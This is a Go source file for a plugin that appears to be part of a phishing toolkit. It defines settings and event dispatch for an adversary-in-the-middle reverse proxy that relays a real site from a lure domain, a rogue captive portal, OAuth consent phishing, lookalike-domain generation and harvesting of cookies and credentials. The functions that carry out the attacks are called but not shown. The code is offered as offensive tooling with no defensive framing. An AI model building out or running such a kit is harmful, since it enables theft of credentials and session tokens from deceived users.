package main

import (
	"encoding/json"
	"sync"
)

var (
	sendMu sync.Mutex
	sendFn func(event string, payload []byte)
	host   map[string]interface{}
)

func setSend(fn func(event string, payload []byte)) {
	sendMu.Lock()
	sendFn = fn
	sendMu.Unlock()
}

func sendEvent(event string, payload interface{}) {
	sendMu.Lock()
	fn := sendFn
	sendMu.Unlock()
	if fn == nil {
		return
	}
	var raw []byte
	switch v := payload.(type) {
	case []byte:
		raw = v
	case nil:
		raw = nil
	default:
		raw, _ = json.Marshal(v)
	}
	fn(event, raw)
}

func handleInit(hostJSON []byte) error {
	if len(hostJSON) > 0 {
		_ = json.Unmarshal(hostJSON, &host)
	}
	sendEvent("status", map[string]interface{}{"state": "loaded"})
	return nil
}

func handleUnload() {
	stopAllProxies()
	sendEvent("status", map[string]interface{}{"state": "unloaded"})
}

// ---------------------------------------------------------------------------
// settings
// ---------------------------------------------------------------------------

type Settings struct {
	// Reverse-proxy (AiTM) mode
	PhishDomain string `json:"phishDomain"` // domain the victim is lured to
	Upstream    string `json:"upstream"`    // real site being relayed
	ListenPort  int    `json:"listenPort"`
	// Captive portal
	PortalSSID string `json:"portalSsid"`
	PortalHTML string `json:"portalHtml"`
	// OAuth consent
	OAuthClientID string `json:"oauthClientId"`
	OAuthScopes   string `json:"oauthScopes"`
	OAuthTenant   string `json:"oauthTenant"`
	// Lookalike generation input
	TargetDomain string `json:"targetDomain"`
	// Cookie / token harvesting
	HarvestCookies bool `json:"harvestCookies"`
	HarvestCreds   bool `json:"harvestCreds"`
}

func handleEvent(event string, payload []byte) error {
	preflight()
	var s Settings
	if len(payload) > 0 {
		_ = json.Unmarshal(payload, &s)
	}

	switch event {
	case "ping":
		sendEvent("pong", nil)
	case "lookalikes":
		go genLookalikes(s)
	case "start_proxy":
		go startProxy(s)
	case "stop_proxy":
		stopAllProxies()
		sendEvent("status", map[string]interface{}{"state": "idle", "detail": "proxy stopped"})
	case "setup_dns":
		go setupDNSRedirect(s)
	case "portal":
		go deployPortal(s)
	case "oauth":
		go buildOAuthURL(s)
	case "templates":
		go listTemplates()
	default:
		sendEvent("error", map[string]interface{}{"message": "unknown event: " + event})
	}
	return nil
}

// Required by cgo for -buildmode=c-shared.
func main() {}
